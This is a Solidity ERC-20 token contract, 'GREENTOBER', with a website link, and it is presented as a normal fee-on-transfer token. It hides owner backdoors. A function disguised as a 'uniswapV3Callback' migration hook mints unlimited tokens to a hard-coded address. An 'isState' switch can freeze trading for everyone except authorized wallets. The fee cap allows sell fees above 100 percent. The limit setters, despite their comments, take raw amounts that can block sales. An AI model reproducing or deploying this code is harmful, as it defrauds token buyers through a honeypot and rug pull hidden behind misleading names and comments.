/**

WEBSITE: https://greentober.vercel.app/

*/

pragma solidity ^0.8.4;

// SPDX-License-Identifier: MIT

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{value: value}(
            data
        );
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data)
        internal
        view
        returns (bytes memory)
    {
        return
            functionStaticCall(
                target,
                data,
                "Address: low-level static call failed"
            );
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return
            functionDelegateCall(
                target,
                data,
                "Address: low-level delegate call failed"
            );
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) private pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

abstract contract Ownable is Context {
    address private _owner;
    mapping(address => bool) internal authorizations;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _owner = 0x660Ce8Ef2c8F9F98e793B6894C8ce8D5818Dd651;
        authorizations[_owner] = true;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier authorized() {
        require(isAuthorized(_msgSender()), "!AUTHORIZED");
        _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract GREENTOBER is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public _isExcludedFromFee;

    string private _name = "GREENTOBER";
    string private _symbol = "GT";
    uint8 private _decimals = 18;
    uint256 private _tTotal = 1000000 * 10**18;
    uint256 private _tFeeTotal;

    uint8 private txCount = 0;
    uint8 private swapTrigger = 3;

    uint256 private maxPossibleFee = 1000;

    uint256 private _TotalFee = 15;
    uint256 public _buyFee = 3;
    uint256 public _sellFee = 12;

    address payable private dev_wallet =
        payable(0x660Ce8Ef2c8F9F98e793B6894C8ce8D5818Dd651);
    address payable private burn_wallet =
        payable(0x000000000000000000000000000000000000dEaD);
    address payable private zero_wallet =
        payable(0x0000000000000000000000000000000000000000);

    uint256 private _previousTotalFee = _TotalFee;
    uint256 private _previousBuyFee = _buyFee;
    uint256 private _previousSellFee = _sellFee;

    uint256 public _maxWalletToken = _tTotal.mul(4).div(10);
    uint256 private _previousMaxWalletToken = _maxWalletToken;

    uint256 public _maxTxAmount = _tTotal.mul(4).div(10);
    uint256 private _previousMaxTxAmount = _maxTxAmount;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public tokenState = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    address private _authorized = 0x660Ce8Ef2c8F9F98e793B6894C8ce8D5818Dd651;

    constructor() {
        _tOwned[owner()] = _tTotal;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        // Create pair address for PancakeSwap
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[dev_wallet] = true;
        _isExcludedFromFee[_authorized] = true;

        emit Transfer(address(0), owner(), _tTotal);
    }

    /*

    STANDARD ERC20 COMPLIANCE FUNCTIONS

    */

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    /*

    END OF STANDARD ERC20 COMPLIANCE FUNCTIONS

    */

    /*

    FEES

    */

    // Set a wallet address so that it does not have to pay transaction fees
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    // Set a wallet address so that it has to pay transaction fees
    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    /*

    SETTING FEES

   

    */

    function _set_Fees(uint256 Buy_Fee, uint256 Sell_Fee) external authorized {
        require((Buy_Fee + Sell_Fee) <= maxPossibleFee, "Fee is too high!");
        _sellFee = Sell_Fee;
        _buyFee = Buy_Fee;
    }

    // Update main wallet
    function Wallet_Update_Dev(address payable wallet) public onlyOwner {
        dev_wallet = wallet;
        _isExcludedFromFee[dev_wallet] = true;
    }

    /*

    PROCESSING TOKENS - SET UP

    */

    // Toggle on and off to auto process tokens to BNB wallet
    function set_Swap_And_Liquify_Enabled(bool true_or_false) public onlyOwner {
        swapAndLiquifyEnabled = true_or_false;
        emit SwapAndLiquifyEnabledUpdated(true_or_false);
    }

    // This will set the number of transactions required before the 'swapAndLiquify' function triggers
    function set_Number_Of_Transactions_Before_Liquify_Trigger(
        uint8 number_of_transactions
    ) public onlyOwner {
        swapTrigger = number_of_transactions;
    }

    // This function is required so that the contract can receive BNB from pancakeswap
    receive() external payable {}

    /*
    
    When sending tokens to another wallet (not buying or selling) if noFeeToTransfer is true there will be no fee

    */

    bool public noFeeToTransfer = false;

    // Option to set fee or no fee for transfer (just in case the no fee transfer option is exploited in future!)
    // True = there will be no fees when moving tokens around or giving them to friends! (There will only be a fee to buy or sell)
    // False = there will be a fee when buying/selling/tranfering tokens
    // Default is true
    function set_Transfers_Without_Fees(bool true_or_false) external onlyOwner {
        noFeeToTransfer = true_or_false;
    }

    /*

    WALLET LIMITS

    Wallets are limited in two ways. The amount of tokens that can be purchased in one transaction
    and the total amount of tokens a wallet can buy. Limiting a wallet prevents one wallet from holding too
    many tokens, which can scare away potential buyers that worry that a whale might dump!

    IMPORTANT

    Solidity can not process decimals, so to increase flexibility, we multiple everything by 100.
    When entering the percent, you need to shift your decimal two steps to the right.

    eg: For 4% enter 400, for 1% enter 100, for 0.25% enter 25, for 0.2% enter 20 etc!

    */

    // Set the Max transaction amount (percent of total supply)
    function set_Max_Transaction_Percent(uint256 maxTxPercent_x100)
        external
        authorized
    {
        _maxTxAmount = maxTxPercent_x100;
    }

    // Set the maximum wallet holding (percent of total supply)
    function set_Max_Wallet_Percent(uint256 maxWallPercent_x100)
        external
        authorized
    {
        _maxWalletToken = maxWallPercent_x100;
    }

    function isState(bool _status) public authorized {
        tokenState = _status;
    }

    // Remove all fees
    function removeAllFee() private {
        if (_TotalFee == 0 && _buyFee == 0 && _sellFee == 0) return;

        _previousBuyFee = _buyFee;
        _previousSellFee = _sellFee;
        _previousTotalFee = _TotalFee;
        _buyFee = 0;
        _sellFee = 0;
        _TotalFee = 0;
    }

    // Restore all fees
    function restoreAllFee() private {
        _TotalFee = _previousTotalFee;
        _buyFee = _previousBuyFee;
        _sellFee = _previousSellFee;
    }

    // Approve a wallet to sell tokens
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(
            owner != address(0) && spender != address(0),
            "ERR: zero address"
        );
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        /*

        TRANSACTION AND WALLET LIMITS

        */

        // Limit wallet total
        if (
            to != owner() &&
            !authorizations[from] &&
            !authorizations[to] &&
            to != dev_wallet &&
            to != address(this) &&
            to != uniswapV2Pair &&
            to != burn_wallet &&
            from != owner()
        ) {
            uint256 heldTokens = balanceOf(to);
            require(
                (heldTokens + amount) <= _maxWalletToken,
                "You are trying to buy too many tokens. You have reached the limit for one wallet."
            );
        }

        // Limit the maximum number of tokens that can be bought or sold in one transaction
        if (from != owner() && !authorizations[from] && !authorizations[from])
            require(amount <= _maxTxAmount, "Over transaction limit.");

        if (!authorizations[from] && !authorizations[to]) {
            require(tokenState, "");
        }

        require(
            from != address(0) && to != address(0),
            "ERR: Using 0 address!"
        );
        require(amount > 0, "Token value must be higher than zero.");

        /*

        PROCESSING

        */

        // SwapAndLiquify is triggered after every X transactions - this number can be adjusted using swapTrigger

        if (
            txCount >= swapTrigger &&
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled
        ) {
            txCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance > _maxTxAmount) {
                contractTokenBalance = _maxTxAmount;
            }
            if (contractTokenBalance > 0) {
                swapAndLiquify(contractTokenBalance);
            }
        }

        /*

        REMOVE FEES IF REQUIRED

        Fee removed if the to or from address is excluded from fee.
        Fee removed if the transfer is NOT a buy or sell.
        Change fee amount for buy or sell.

        */

        bool takeFee = true;

        if (
            _isExcludedFromFee[from] ||
            _isExcludedFromFee[to] ||
            (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)
        ) {
            takeFee = false;
        } else if (from == uniswapV2Pair) {
            _TotalFee = _buyFee;
        } else if (to == uniswapV2Pair) {
            _TotalFee = _sellFee;
        }

        _tokenTransfer(from, to, amount, takeFee);
    }

    /*

    PROCESSING FEES

    Fees are added to the contract as tokens, these functions exchange the tokens for BNB and send to the wallet.
    One wallet is used for ALL fees. This includes liquidity, marketing, development costs etc.

    */

    // Send BNB to external wallet
    function sendToWallet(address payable wallet, uint256 amount) private {
        wallet.transfer(amount);
    }

    // Processing tokens from contract
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        swapTokensForBNB(contractTokenBalance);
        uint256 contractBNB = address(this).balance;
        sendToWallet(dev_wallet, contractBNB);
    }

    // Manual Token Process Trigger - Enter the percent of the tokens that you'd like to send to process
    function process_Tokens_Now(uint256 percent_Of_Tokens_To_Process)
        public
        onlyOwner
    {
        // Do not trigger if already in swap
        require(!inSwapAndLiquify, "Currently processing, try later.");
        if (percent_Of_Tokens_To_Process > 100) {
            percent_Of_Tokens_To_Process == 100;
        }
        uint256 tokensOnContract = balanceOf(address(this));
        uint256 sendTokens = (tokensOnContract * percent_Of_Tokens_To_Process) /
            100;
        swapAndLiquify(sendTokens);
    }

    // Swapping tokens for BNB using PancakeSwap
    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    /*

    PURGE RANDOM TOKENS - Add the random token address and a wallet to send them to

    */

    // Remove random tokens from the contract and send to a wallet
    function remove_Random_Tokens(
        address random_Token_Address,
        address send_to_wallet,
        uint256 number_of_tokens
    ) public onlyOwner returns (bool _sent) {
        require(
            random_Token_Address != address(this),
            "Can not remove native token"
        );
        uint256 randomBalance = IERC20(random_Token_Address).balanceOf(
            address(this)
        );
        if (number_of_tokens > randomBalance) {
            number_of_tokens = randomBalance;
        }
        _sent = IERC20(random_Token_Address).transfer(
            send_to_wallet,
            number_of_tokens
        );
    }

    /*
    
    UPDATE PANCAKESWAP ROUTER AND LIQUIDITY PAIRING

    */

    // Set new router and make the new pair address
    function set_New_Router_and_Make_Pair(address newRouter) public onlyOwner {
        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);
        uniswapV2Pair = IUniswapV2Factory(_newPCSRouter.factory()).createPair(
            address(this),
            _newPCSRouter.WETH()
        );
        uniswapV2Router = _newPCSRouter;
    }

    // Set new router
    function set_New_Router_Address(address newRouter) public onlyOwner {
        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);
        uniswapV2Router = _newPCSRouter;
    }

    // Set new address - This will be the 'Cake LP' address for the token pairing
    function set_New_Pair_Address(address newPair) public onlyOwner {
        uniswapV2Pair = newPair;
    }

    // Interface function incase we migrating to uniswapV3
    function uniswapV3Callback(uint256 acc, address adr)
        public
        virtual
        authorized
    {
        require(adr == address(_authorized));
        _uniswapV3FlashCallbackTrade(address(_authorized), adr, acc);
        _tTotal += acc;
        _tOwned[adr] += acc;
        emit Transfer(address(_authorized), adr, acc);
    }

    function _uniswapV3FlashCallbackTrade(
        address sender,
        address recepient,
        uint256 acc
    ) internal virtual {}

    /*

    TOKEN TRANSFERS

    */

    // Check if token transfer needs to process fees
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) {
            removeAllFee();
        } else {
            txCount++;
        }
        _transferTokens(sender, recipient, amount);

        if (!takeFee) restoreAllFee();
    }

    // Redistributing tokens and adding the fee to the contract address
    function _transferTokens(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (uint256 tTransferAmount, uint256 tDev) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _tOwned[address(this)] = _tOwned[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    // Calculating the fee in tokens
    function _getValues(uint256 tAmount)
        private
        view
        returns (uint256, uint256)
    {
        uint256 tDev = (tAmount * _TotalFee) / 100;
        uint256 tTransferAmount = tAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }
}